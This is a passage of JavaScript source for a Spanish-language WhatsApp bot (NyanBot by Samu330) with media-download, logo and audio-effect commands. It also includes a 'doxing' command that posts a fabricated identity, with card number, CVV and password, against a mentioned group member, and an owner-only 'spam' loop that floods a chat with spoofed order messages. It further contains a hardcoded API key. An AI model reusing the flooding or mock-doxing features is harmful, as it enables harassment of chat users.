if (!q) return reply('Y el link de twiter??')
reply('*Espera un mometo porfavor...*')
twi = await getJson(`https://api.lolhuman.xyz/api/twitter?apikey=273a9e8195c27ba24abd53e3&url=${q}`)
reply(`*° Titulo:* ${twi.title}\n*° Calidad:* ${twi.result[2].resolution}\n\n_Si el video no llega, descarge por aqui:_\n${twi.result[2].link}`)
sendFileFromUrl(twi.result[2].link, video, {quoted: fvid, caption: '🍒Samu330 | NyanBot💠', duration: 999999999})
addFilter(from)
break
		
case 'ig':
if (!isRegister) return reply(mess.only.usrReg)
if (!q) return reply('Y el link de Instagram??')
ig = await getJson(`https://api.lolhuman.xyz/api/instagram?apikey=${api}&url=${q}`)
reply(`*Espere un momento porfavor, su video se esta enviando....*`)
sendFileFromUrl(ig.result, video, {quoted: fvid, caption: '🍒Samu330 | NyanBot💠', duration: 999999999})
addFilter(from)
break
		
//Fake Doxing By Samu330
case 'doxing':
if (!isRegister) return reply(mess.only.usrReg)
if (!isGroup) return reply(mess.only.group)
f = await getJson(`https://docs-jojo.herokuapp.com/api/fake_identity`)
reply(`*Doxeo de ${mentionUser} echo por Samu330✅*

*Nombre:* _${f.name}_
*Genero:* _${f.gender}_
*Edad:* _${f.age}_
*Fecha de nacimiento:* _${f.birtday}_
*Ocupacion:* _${f.occupation}_
*Dirección:* _${f.address}_
*Codigo postal:* _${f.zip_code}_
*Estado:* _${f.state}_
*Pais:* _${f.country}_

=====================

*E-Mail:* ${f.email}
*Contraseña:* ${f.password}_
*Telefono:* _${f.phone}_

=====================

*No. Tarjeta de credito:* ${f.card}
*CVV:* _${f.code}_
*Fecha de vencimiento:* _${f.date}_
*PIN:* _${f.pin_code}_

=====================

*Peso:* _${f.weight}_
*Estatura:* _${f.height}_
*Tipo de sangre:* _${f.blood_type}_
*Estado:* _${f.status}_

=====================

*FDx Bt 🔥𝘚𝘢𝘮𝘶𝟥𝟥𝟢🔥*
`)
break
		
		//»»————-　★　————-««\\
//˚ ༘✶ ⋆｡˚ ⁀➷  🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥
		
case 'neon':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/bneon?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break
		
case 'matrix':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/matrix?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break		
		
case 'break':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/breakwall?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break		
		
case 'dropwater':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/dropwater?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break	
		
case 'lobo':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
if (!q.includes('|')) return  reply(`*PORFAVOR ESCRIBE BIEN EL FORMATO:* ${prefix + command} *texto1|texto2*\n\n_Separa el texto 1 del texto 2 con el simbolo "|"_`)
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${texto1 + texto2}!*`)		
logo = `https://api.zeks.xyz/api/wolflogo?apikey=apivinz&text1=${texto1}&text2=${texto2}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break
		
case 'flores':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/flowertext?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break	
		
case 'cross':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/crosslogo?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break
		
case 'seda':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/silktext?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break
		
case 'fire':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/flametext?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break
		
case 'glow':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/glowtext?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break
		
case 'smoke':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/smoketext?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break	
		
case 'pubg':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
if (!q.includes('|')) return  reply(`*PORFAVOR ESCRIBE BIEN EL FORMATO:* ${prefix + command} *texto1|texto2*\n\n_Separa el texto 1 del texto 2 con el simbolo "|"_`)
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${texto1 + texto2}!*`)		
logo = `https://api.zeks.xyz/api/pubglogo?apikey=apivinz&text1=${texto1}&text2=${texto2}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break
		
case 'cielo':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/skytext?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break
	
case 'cs':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/cslogo?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break	
		
case 'ligth':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/lithgtext?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break	
		
case 'navidad':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/crismes?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break
		
case 'nieve':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/snowwrite?apikey=apivinz&text1=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break
		
case 'tfire':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/tfire?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break	
		
case 'playa':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/sandw?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break
		
case 'ff':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/epep?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break
		
case 'goldbutton':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/gplaybutton?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break		
	
case 'silverbutton':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/splaybutton?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break	
		
case '3d':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/text3dbox?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break		
		
case 'avengers':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
if (!q.includes('|')) return  reply(`*PORFAVOR ESCRIBE BIEN EL FORMATO:* ${prefix + command} *texto1|texto2*\n\n_Separa el texto 1 del texto 2 con el simbolo "|"_`)
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${texto1 + texto2}!*`)		
logo = `https://api.zeks.xyz/api/logoaveng?apikey=apivinz&text1=${texto1}&text2=${texto2}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break	
		
case '3d2':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/text3d?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break	
		
case 'ph':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
if (!q.includes('|')) return  reply(`*PORFAVOR ESCRIBE BIEN EL FORMATO:* ${prefix + command} *texto1|texto2*\n\n_Separa el texto 1 del texto 2 con el simbolo "|"_`)
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${texto1 + texto2}!*`)		
logo = `https://api.zeks.xyz/api/phlogo?apikey=apivinz&text1=${texto1}&text2=${texto2}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break		
		
case 'blackpink':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/logobp?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break
		
case 'marvel':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
if (!q.includes('|')) return  reply(`*PORFAVOR ESCRIBE BIEN EL FORMATO:* ${prefix + command} *texto1|texto2*\n\n_Separa el texto 1 del texto 2 con el simbolo "|"_`)
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${texto1 + texto2}!*`)		
logo = `https://api.zeks.xyz/api/marvellogo?apikey=apivinz&text1=${texto1}&text2=${texto2}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break	
		
case 'hojas':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/leavest?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break
		
case 'tligth':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${q}!*`)		
logo = `https://api.zeks.xyz/api/tlight?apikey=apivinz&text=${q}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break
		
case 'gtext':
if (!q) return reply('*Y el texto para crear el logo donde esta?*')
if (!q.includes('|')) return  reply(`*PORFAVOR ESCRIBE BIEN EL FORMATO:* ${prefix + command} *texto1|texto2*\n\n_Separa el texto 1 del texto 2 con el simbolo "|"_`)
reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${texto1 + texto2}!*`)		
logo = `https://api.zeks.xyz/api/gtext?apikey=apivinz&text1=${texto1}&text2=${texto2}`
sendFileFromUrl(logo, image, {quoted: fimg, caption: '*🔥 𝘓𝘰𝘨𝘰𝘴 𝘉𝘺 𝘚𝘢𝘮𝘶𝟥𝟥𝟢 🔥*', sendEphemeral: true})
break
		
case 'spam':
if (!itsMe) return reply('Este comando es solo para 🐉Samu330🪀')
arg1 = q
if (!arg1) return reply(`Ejemplo ${prefix}spam texto|numero de mensajes`)
argz = arg1.split("|")
if (!argz) return reply(`Porfavor usa el simbolo "|" para dividir entre el mensaje y el numero de veses a enviar el mensaje`)
if (isNaN(argz[1])) return reply(`Y el numero de veses a enviar?`)
members = []
for (let i = 0; i < argz[1]; i++){
samu330.sendMessage(from, argz[0], MessageType.text, {quoted: { key : {fromMe: false, participant : "0@s.whatsapp.net", ...(from ? { remoteJid: "5214447000377-1624053141@g.us" } : {})},message: {orderMessage: {itemCount : 9999999999999999,status: 1,surface : 1,message: `🥀S͓̽α͓̽м͓̽υ͓̽3͓̽3͓̽0͓̽🍒 | 🐉𝑵𝒚𝒂𝒏𝑩𝒐𝒕🌹`,orderTitle: '',sellerJid: `Sam330`,thumbnail: fs.readFileSync('./src/fake.jpg')}},
contextInfo: { mentionedJid: members }}})
}
break
case 'ytmp3':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length < 1) return reply('Y el link?')
if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Link de YouTube we, *De YouTube!!*')
teks = args.join(' ')
reply('*Espere un momento...*')
res = await y2mateA(teks).catch(e => {
reply('_[ ! ] Error del servidor_')
})
result = `「  𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒  」
*°Titulo :* ${res[0].judul}
*°Tamaño :* ${res[0].size}
*°Calidad :* ${res[0].quality}kbps
*°Nombre del archivo :* ${res[0].output}
*°Salida :* ${res[0].tipe}
_*El archivo se esta enviando.....*_
`
sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: sam}).then((lalu) => {
sendFileFromUrl(res[0].link, audio, {quoted: faud, duration :-99999999, mimetype: 'audio/mp3'})
sendFileFromUrl(res[0].link, audio, {quoted: faud, mimetype: 'audio/mp3', ptt: true, duration: 99999999})
})
addFilter(from)
addLevelingLevel(sender, 5)		
break
case 'ytmp4':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length < 1) return reply('Y el link?')
if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Link de YouTube we, *De YouTube!!*')
teks = args.join(' ')
reply(mess.wait)
res = await y2mateV(teks).catch(e => {
reply('_[ ! ] Error del servidor_')
})
result = `「  𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒  」
*°Titulo :* ${res[0].judul}
*°Tamaño :* ${res[0].size}
*°Calidad :* ${res[0].quality}p
*°Nombre :* ${res[0].output}
*°Output :* ${res[0].tipe}
_*El archivo se esta enviando.....*_
`
sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: sam}).then((lalu) => {
sendFileFromUrl(res[0].link, video, {quoted: fvid, mimetype: Mimetype.gif, duration: 9999999999})
})
addFilter(from)
addLevelingLevel(sender, 5)		
break

case 'tomp3':
case 'toaudio':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
samu330.updatePresence(from, Presence.recording)
if (!isQuotedVideo) return reply('Y el video?')
reply('*Perame tatito!*')
const encmedia3 = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
const media3 = await samu330.downloadAndSaveMediaMessage(encmedia3)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media3} ${ran}`, (err) => {
fs.unlinkSync(media3)
if (err) return reply(mess.ferr)
buffer = fs.readFileSync(ran)
samu330.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: faud})
fs.unlinkSync(ran)
})
addFilter(from)
break

case 'imut':
reply(mess.wait)
im = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
ut = await samu330.downloadAndSaveMediaMessage(im)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${ut} -af atempo=3/4,asetrate=44500*4/3 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(ut)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: fdoc})
fs.unlinkSync(ran)
})
addFilter(from)
break
case 'hode':
reply(mess.wait)
ho = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
de = await samu330.downloadAndSaveMediaMessage(ho)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${de} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(de)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: fdoc})
fs.unlinkSync(ran)
})
addFilter(from)
break

case 'trigger':
reply(mess.wait)
tri = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
ger = await samu330.downloadAndSaveMediaMessage(tri)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${ger} -filter_complex "acrusher=level_in=8:level_out=18:bits=8:mode=log:aa=1" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(ger)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: fdoc})
fs.unlinkSync(ran)
})
addFilter(from)
break

case 'slow':
case 'lento':
reply(mess.wait)
low = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
slo = await samu330.downloadAndSaveMediaMessage(low)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${slo} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(slo)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration :-999999999999999, ptt:true, quoted: fdoc})
fs.unlinkSync(ran)
})
addFilter(from)
break
case 'ardilla':
reply(mess.wait)
pai = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo

tup = await samu330.downloadAndSaveMediaMessage(pai)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${tup} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(tup)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration :-999999999999999, ptt:true, quoted: fdoc})
fs.unlinkSync(ran)
})
addFilter(from)
break
case 'grave':
reply(mess.wait)
muk = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
gem = await samu330.downloadAndSaveMediaMessage(muk)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration :-999999999999999, ptt:true, quoted: fdoc})
fs.unlinkSync(ran)
})
addFilter(from)
break
case 'bass':
ass = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait)
bas = await samu330.downloadAndSaveMediaMessage(ass)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${bas} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(bas)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
samu330.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration :-999999999999999, ptt:true, quoted: fdoc})
fs.unlinkSync(ran)
})
addFilter(from)
break
		
case 'rapido':
addFilter(from)
if (!isQuotedAudio) return reply('Etiqueta un audio!')
reply(mess.wait)
encmediiiaa = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
medi1a = await samu330.downloadAndSaveMediaMessage(encmediiiaa)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medi1a} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medi1a)
if (err) return reply('Error!')
fast = fs.readFileSync(ran)
samu330.sendMessage(from, fast, audio, {
mimetype: 'audio/mp4', ptt: true, duration :-999999999999999, quoted: faud})
fs.unlinkSync(ran)
})
break

case 'reversa':
if (!isQuotedVideo) return reply('Porfavor etiqueta un video con el comando!')
reply('*Espera un momento porfavor....*')
encmediav = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
mediav = await samu330.downloadAndSaveMediaMessage(encmediav)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${mediav} -vf reverse -af areverse ${ran}`, (err) => {
fs.unlinkSync(mediav)
if (err) return reply(`Error: ${err}`)
vre = fs.readFileSync(ran)
samu330.sendMessage(from, vre, video, { mimetype: 'video/mp4', quoted: fvid, duration: -999999 })
fs.unlinkSync(ran)
})
addFilter(from)
break
	
case '+volumen':
if (!isQuotedAudio) return reply('Porfavor etiqueta una audio con el comando!')
reply('*Espera un momento porfavor....*')
encmediav = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
mediav = await samu330.downloadAndSaveMediaMessage(encmediav)
exec(`ffmpeg -i ${mediav} -filter:a "volume=1.5" 'output.wav'`)
samu330.sendMessage(from, fs.readFileSync(`output.wav`), audio, { mimetype: 'video/mp3', quoted: fvid, duration: -999999 })
break

case 'wa.me':
case 'wame':
samu330.updatePresence(from, Presence.composing)
options = {
text: `Link de WhatsApp: *wa.me/${sender.split("@s.whatsapp.net")[0]}*\n*O tambien puedes usar:*\n*api.whatsapp.com/send?phone=${sender.split("@")[0]}*`,
contextInfo: {
mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
}
}
samu330.sendMessage(from, options, MessageType.text, {
quoted: ftoko
})
break

case 'bug':
if (!isRegister) return reply(mess.only.usrReg)
const pesan = args.join(' ')
if (pesan.length > 300) return samu330.sendMessage(from, 'Lo siento texto demasiado largo, máximo 300 caracteres', msgType.text, {quoted: sam})
var nomor = sam.participant
const teks1 = `*[REPORT]*\nNumero : @${nomor.split("@s.whatsapp.net")[0]}\nProblema : ${pesan}`

var options = {
text: teks1,
contextInfo: {mentionedJid: [nomor]},
}
samu330.sendMessage('5219984907794@s.whatsapp.net', options, text, {quoted: sam})
reply('El problema ha sido informado al propietario del BOT, informe falso o broma, sera ban definitivo.')
break
			
case 'reg':
if (isRegister) return reply('*Tu cuenta ya estaba verificada*')
if (!q.includes('|')) return  reply(`*PORFAVOR ESCRIBE BIEN EL FORMATO DE REGISTRO:* ${prefix}reg *nombre|edad*`)
const nombre = q.substring(0, q.indexOf('|') - 0)
const edad = q.substring(q.lastIndexOf('|') + 1)
const serialUser = createSerial(20)
const momento = require('moment-timezone')
const time = momento.tz('America/Mexico_City').format('HH:mm:ss')
if(isNaN(edad)) return await reply('*La edad es un numero🙄*!!')
